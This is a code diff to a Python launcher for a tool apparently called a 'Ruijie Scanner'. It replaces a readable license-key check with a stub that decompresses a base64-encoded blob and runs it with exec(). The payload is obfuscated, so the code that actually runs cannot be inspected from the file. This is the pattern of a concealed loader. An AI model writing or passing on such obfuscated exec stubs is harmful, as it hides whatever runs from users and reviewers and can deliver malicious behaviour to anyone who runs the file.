@@ -1,59 +1,6 @@
 #!/usr/bin/env python3
-import os, sys, json, time, hashlib, subprocess
-
-DB_FILE = "mgkan_keys.json"
-
-def load_db():
-    try:
-        with open(DB_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return {"keys": {}, "used": []}
-
-def validate_key(key):
-    db = load_db()
-    key = key.upper()
-    if key not in db["keys"]:
-        return False, "❌ Invalid key. Please try again."
-    if int(time.time()) > db["keys"][key]["expiry"]:
-        return False, "❌ Key expired. Please contact admin."
-    if key in db.get("used", []):
-        return False, "❌ Key already used. Please contact admin."
-    return True, "✅ Key valid"
-
-def register_use(key):
-    db = load_db()
-    if "used" not in db:
-        db["used"] = []
-    db["used"].append(key)
-    with open(DB_FILE, 'w') as f:
-        json.dump(db, f, indent=2)
-
-def main():
-    print("\n🔥 MGKAN TOOL - Ruijie Scanner\n")
-    
-    # Loop until valid key is entered
-    while True:
-        if not os.path.exists("mgkan_key.txt"):
-            key = input("🔑 Enter your key: ").strip()
-            with open("mgkan_key.txt", "w") as f:
-                f.write(key)
-        else:
-            with open("mgkan_key.txt", "r") as f:
-                key = f.read().strip()
-        
-        valid, msg = validate_key(key)
-        if valid:
-            print(msg)
-            break
-        else:
-            print(msg)
-            print("🔄 Please enter a valid key.\n")
-            os.remove("mgkan_key.txt")  # Delete invalid key file
-    
-    register_use(key)
-    print("✅ Access granted! Launching...\n")
-    os.system("python3 scanner.py")
-
-if __name__ == "__main__":
-    main()
+import base64, zlib, os, sys
+if not os.path.exists("mgkan_key.txt"):
+    print("❌ No key found. Run MgKan.py first.")
+    sys.exit(1)
+exec(zlib.decompress(base64.b64decode("eJyNVUFv0zAUvudXvGWHJVLwJLhNGtLQNjStMAS7dVXkNi+tt8SxbGdtNO0GNy5IHEGc+GP8An4Cz07atJRtWKob2X7v+/y97yW7O/u10ftjIfdR3oJq7KySLwJRqkpbqEwCpqHp2lQyAStKTGDGzawQY9qpx0pXEzQmCI5fpadngxM4hLCc3nCZ3mBjmAsLgyDDHIqKZ2k2juKDAGhY3bQPbsyFnUGlUEZdmgT29F4M3EDen3JDo6219HSYyxjlsd/HxQSV7c925+5CRyM8gLv7BMLaYEbPw9F9S+mWFyLjFh3XiH4dtWxMt1jR9Uu0SWs0s1op1N2qyP2GrCwISWHDFm20ReOUF4aEC399/wxn0sP6ZPCuQG7QiQF8yoVk4TKxkDZycjM3RXEML9cAhvQ3Goa4UEI3T+CdE0N/ELMV3qSSlk8s8Kxcx3SX8RdhU7RRK1dCcsVPAvBCI88acCGPonTxl7r24d8++XCvSOcTjVNhLOqUcj1eFGLccuwr0BN1YvnNEcUNR8HmGuNURpn5/MFDDpxvOdDbLqtLFWVk/zwh0AylPXwet9xLKuHS4Eq7EoZX8vePrz/hzevzo7dweXExgGfwvhbXAuHDhEuJ+kqGLQc/7cKgqhTU0ooCVk4BYYCAkIrY0p2JAr2KPTmSw+lQGaa4nTFckIwm6ruR2YUN4812an0tpKqJKhH9AicOBZqq1m7zAMKYGauF6jTf7ti/AKiq8/BfnetGzuZaWOxl961LVjr47+T6weTtXXLmnBhts149eFETKM2Ujm+9Atbl9JubQG1VKXZTjjGB3jxyowfCOo+Q8B+XTeOrDLwvPVv5YzmowhrL6ha3iuvsc4wFWqSa9ubJySy9w7YabN2uriOPJu6VDlPNiUu2AwNey8lMyCljPRkiQR8Gi2UUdt8MMK2fmWroTED6pankJaYpHNJXIU1dd6Rp2CrTtkrwB8SB5vI=")))
